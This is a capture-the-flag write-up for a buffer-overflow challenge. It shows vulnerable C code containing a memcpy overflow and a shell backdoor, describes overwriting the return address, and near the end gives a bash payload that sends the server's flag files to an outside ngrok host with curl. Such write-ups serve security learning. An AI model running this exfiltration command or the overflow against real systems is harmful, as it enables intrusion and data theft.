# Go Pwn Gown (day7)

<p align="justify">This challenge was a Pwn challenge in which the goal was to perform a buffer overflow to read the flag stored on the server. Source code was provided with a docker file so that the server could have been ran locally, which revealed very helpful insofar as I had access to server logs. </p>

<p align="center"><img src="Screenshots/S1.png" alt="Desc"></p>

<p align="justify"> Looking at source code, it seemed that a backdoor was already included in the code of the running server. This backdoor shown in the snippet below could have been used to run command remotely : </p>

````c
void unsafeFunction(char *gown) {
    char buffer[64];
    memcpy(buffer, gown, 128); // UTF8 AMIRIGHT ?!
    printf("Received: %s\n", buffer);
}

void laluBackdoor() {
    char *bash_path = "/bin/bash";
    extern char **environ;
    execle(bash_path, bash_path, "-c", "echo $(${GOWN})", NULL, environ);
}
````

The flaw here is caused by the use of a buffer of size 64 in which 128 bytes are copied. To exploit it, I started by running the docker on my machine to adjust my payload using the logs. I developped a tiny C script avalible under exploit.c in this repo, to guess the number of chars I had to sent before overwritte ret address on the stack. 

<p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S5.png" alt="Desc"></p>

````bash
#!/bin/bash
cat /flag/* | curl -X POST --data @- http://6.tcp.eu.ngrok.io:13524/
````

Flag : _RM{OffenSkillSaysWhat2024YouGotGowned}_ , thanks _Laluka_ for this challenge !
